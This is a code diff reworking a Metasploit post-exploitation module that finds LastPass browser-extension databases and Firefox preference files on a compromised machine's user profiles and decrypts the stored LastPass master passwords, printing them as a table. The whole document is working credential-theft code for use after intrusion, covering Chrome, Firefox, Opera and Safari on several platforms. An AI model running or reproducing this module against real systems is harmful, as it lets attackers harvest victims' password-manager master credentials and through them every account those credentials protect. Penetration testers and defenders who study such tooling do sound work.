@@ -16,8 +16,13 @@ class Metasploit3 < Msf::Post
         'Name' => 'LastPass Master Password Extractor',
         'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords',
         'License' => MSF_LICENSE,
-        'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
+        'Author' => [
+          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
+          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
+          'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
+        ],
         'Platform' => %w(linux osx unix win),
+        'References'   => [['URL', 'http://www.martinvigo.com/a-look-into-lastpass/']],
         'SessionTypes' => %w(meterpreter shell)
       )
     )
@@ -37,7 +42,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    print_status "Looking for credentials in all databases found..."
+    print_status "Extracting credentials from #{db_map.size} LastPass databases"
 
     # an array of [user, encrypted password, browser]
     credentials = [] # All credentials to be decrypted
@@ -45,19 +50,31 @@ class Metasploit3 < Msf::Post
       if browser == 'Firefox'
         paths.each do |path|
           data = read_file(path)
-          loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{path}")
+          loot_path = store_loot(
+            'firefox.preferences',
+            'text/javascript',
+            session,
+            data,
+            nil,
+            "Firefox preferences file #{path}"
+          )
 
           # Extract usernames and passwords from preference file
-          firefox_encoded_creds = firefox_credentials(loot_path)
-          next unless firefox_encoded_creds
-          firefox_encoded_creds.each do |creds|
-            credentials << [URI.unescape(creds[0]), URI.unescape(creds[1]), browser] unless creds[0].nil? || creds[1].nil?
+          firefox_credentials(loot_path).each do |creds|
+            credentials << [URI.unescape(creds[0]), URI.unescape(creds[1]), browser]
           end
         end
       else # Chrome, Safari and Opera
         paths.each do |path|
           data = read_file(path)
-          loot_path = store_loot("#{browser.downcase}.lastpass.database", 'application/x-sqlite3', session, data, nil, "#{browser} LastPass database #{path}")
+          loot_path = store_loot(
+            "#{browser.downcase}.lastpass.database",
+            'application/x-sqlite3',
+            session,
+            data,
+            nil,
+            "#{browser} LastPass database #{path}"
+          )
 
           # Parsing/Querying the DB
           db = SQLite3::Database.new(loot_path)
@@ -71,21 +88,25 @@ class Metasploit3 < Msf::Post
       end
     end
 
-    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => %w(Username Password Browser))
+    credentials_table = Rex::Ui::Text::Table.new(
+      'Header' => "LastPass credentials",
+      'Indent' => 1,
+      'Columns' => %w(Username Password Browser)
+    )
     # Parse and decrypt credentials
     credentials.each do |row| # Decrypt passwords
       user, enc_pass, browser = row
-      print_status "Decrypting password for user #{user} from #{browser}..."
+      vprint_status "Decrypting password for user #{user} from #{browser}..."
       password = clear_text_password(user, enc_pass)
       credentials_table << [user, password, browser]
     end
-    print_good credentials_table.to_s
+    print_good credentials_table.to_s unless credentials.empty?
   end
 
   # Finds the databases in the victim's machine
   def database_paths
     platform = session.platform
-    existing_profiles = user_profiles
+    profiles = user_profiles
     found_dbs_map = {
       'Chrome' => [],
       'Firefox' => [],
@@ -95,62 +116,60 @@ class Metasploit3 < Msf::Post
 
     browser_path_map = {}
 
-    case platform
-    when /win/
-      existing_profiles.each do |user_profile|
-        print_status "Found user: #{user_profile['UserName']}"
+    if datastore['VERBOSE']
+      vprint_status "Found #{profiles.size} users: #{profiles.map { |p| p['UserName'] }.join(', ')}"
+    else
+      print_status "Found #{profiles.size} users"
+    end
+
+    profiles.each do |user_profile|
+      username = user_profile['UserName']
+      case platform
+      when /win/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
           'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
           'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         }
-      end
-    when /unix|linux/
-      existing_profiles.each do |user_profile|
-        print_status "Found user: #{user_profile['UserName']}"
+      when /unix|linux/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox"
         }
-      end
-    when /osx/
-      existing_profiles.each do |user_profile|
-        print_status "Found user: #{user_profile['UserName']}"
+      when /osx/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}\\Firefox\\Profiles",
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
           'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         }
+      else
+        print_error "platform not recognized: #{platform}"
       end
-    else
-      print_error "platform not recognized: #{platform}"
+
+      browser_path_map.each_pair do |browser, path|
+        found_dbs_map[browser] |= find_db_paths(path, browser, username)
+      end
     end
 
-    browser_path_map.each_pair do |browser, path|
-      found_dbs_map[browser] |= find_db_paths(path, browser)
-    end
-
-    found_dbs_map
+    found_dbs_map.delete_if { |browser, paths| paths.empty? }
   end
 
   # Returns a list of DB paths found in the victims' machine
-  def find_db_paths(path, browser)
-    found_dbs_paths = []
+  def find_db_paths(path, browser, username)
+    paths = []
 
-    print_status "Checking in #{browser}..."
+    vprint_status "Checking #{username}'s #{browser}..."
     if browser == "Firefox" # Special case for Firefox
       profiles = firefox_profile_files(path, browser)
-      unless profiles.empty?
-        print_good "Found #{profiles.size} profile files in Firefox"
-        found_dbs_paths |= profiles
-      end
+      paths |= profiles
     else
-      found_dbs_paths |= file_paths(path, browser)
+      paths |= file_paths(path, browser, username)
     end
 
-    found_dbs_paths
+    vprint_good "Found #{paths.size} #{browser} databases for #{username}"
+    paths
   end
 
   # Returns the relevant information from user profiles
@@ -186,7 +205,7 @@ class Metasploit3 < Msf::Post
   end
 
   # Extracts the databases paths from the given folder ignoring . and ..
-  def file_paths(path, browser)
+  def file_paths(path, browser, username)
     found_dbs_paths = []
 
     if directory?(path)
@@ -195,24 +214,17 @@ class Metasploit3 < Msf::Post
         files.each do |file_path|
           found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..'
         end
-
       elsif session.type == "shell"
         files = session.shell_command("ls \"#{path}\"").split
         files.each do |file_path|
           found_dbs_paths.push(File.join(path, file_path)) if file_path != 'Shared'
         end
-
       else
         print_error "Session type not recognized: #{session.type}"
         return found_dbs_paths
       end
     end
 
-    if found_dbs_paths.empty?
-      print_status "No databases found for #{browser}"
-    else
-      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
-    end
     found_dbs_paths
   end
 
@@ -229,38 +241,30 @@ class Metasploit3 < Msf::Post
         print_error "Session type not recognized: #{session.type}"
         return found_dbs_paths
       end
+
+      files.reject! { |file| %w(. ..).include?(file) }
+      files.each do |file_path|
+        found_dbs_paths.push(File.join(path, file_path, 'prefs.js')) if file_path.match(/.*\.default/)
+      end
     end
 
-    files.reject! { |file| %w(. ..).include?(file) }
-    files.each do |file_path|
-      found_dbs_paths.push(File.join(path, file_path, 'prefs.js')) if file_path.match(/.*\.default/)
-    end
-
-    if found_dbs_paths.empty?
-      print_status "No profile paths found for #{browser}"
-    end
     found_dbs_paths
   end
 
   # Parses the Firefox preferences file and returns encoded credentials
   def firefox_credentials(loot_path)
     credentials = []
-    password_line = nil
     File.readlines(loot_path).each do |line|
-      password_line = line if line['extensions.lastpass.loginpws']
-    end
-
-    return nil unless password_line
-
-    if password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)
-      encoded_credentials = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1]
-    else
-      return nil
-    end
-
-    creds_per_user = encoded_credentials.split("|")
-    creds_per_user.each do |user_creds|
-      credentials.push(user_creds.split("=")) if user_creds.split("=").size > 1 # Any valid credentials present?
+      if /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
+        creds_per_user = encoded_creds.split("|")
+        creds_per_user.each do |user_creds|
+          parts = user_creds.split('=')
+          # Any valid credentials present?
+          credentials << parts if parts.size > 1
+        end
+      else
+        next
+      end
     end
 
     credentials
@@ -279,25 +283,17 @@ class Metasploit3 < Msf::Post
       decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
       decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
       encrypted_password = encrypted_data[26..-1]
-      begin
-        decipher_result = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
-      rescue
-        print_error "Password could not be decrypted"
-        return nil
-      end
-
     else # Apply ECB
       decipher = OpenSSL::Cipher.new("AES-256-ECB")
       decipher.decrypt
       decipher.key = sha256_binary_email
-      begin
-        decipher_result = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
-      rescue
-        print_error "Password could not be decrypted"
-        return nil
-      end
+      encrypted_password = encrypted_data
     end
 
-    decipher_result
+    begin
+      decipher.update(Base64.decode64(encrypted_password)) + decipher.final
+    rescue
+      print_error "Password for #{email} could not be decrypted"
+    end
   end
 end
